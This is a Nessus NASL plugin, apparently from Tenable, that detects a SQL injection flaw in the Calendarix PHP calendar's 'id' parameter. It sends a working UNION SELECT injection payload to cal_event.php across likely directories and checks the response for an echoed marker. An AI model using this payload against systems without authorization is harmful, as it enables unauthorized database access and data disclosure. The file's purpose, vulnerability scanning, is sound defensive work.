#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21727);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(18469);

  script_name(english:"Calendarix id Parameter SQL Injection Vulnerabilities");
  script_summary(english:"Checks for id parameter SQL injection in Calendarix");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is susceptible
to multiple SQL injection attacks. 

Description :

The remote host is running Calendarix, a free web-based calendar
application written in PHP. 

The version of Calendarix installed on the remote host fails to
sanitize input to the 'id' parameter to the 'cal_event.php' and
'cal_popup.php' scripts before using it in database queries.  Provided
PHP's 'magic_quotes_gpc' setting is disabled, an unauthenticated
attacker can exploit these flaws to manipulate database queries, which
may lead to disclosure of sensitive information, modification of data,
or attacks against the underlying database. 

See also :

http://www.securityfocus.com/archive/1/437437/30/0/threaded

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 4 
(AV:R/AC:H/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


exploit = string("' UNION SELECT 1,2,'", SCRIPT_NAME, "',4,5,6,7,8,9,10,11,12,13/*");


# Loop through directories.
if (thorough_tests) dirs = make_list("/calendarix", "/calendar", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  req = http_get(
    item:string(
      dir, "/cal_event.php?",
      "id=1", urlencode(str:exploit)
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see our script name in the event title.
  if (string("<div class=popupeventtitlefont>", SCRIPT_NAME) >< res) {
    security_warning(port);
    exit(0);
  }
}
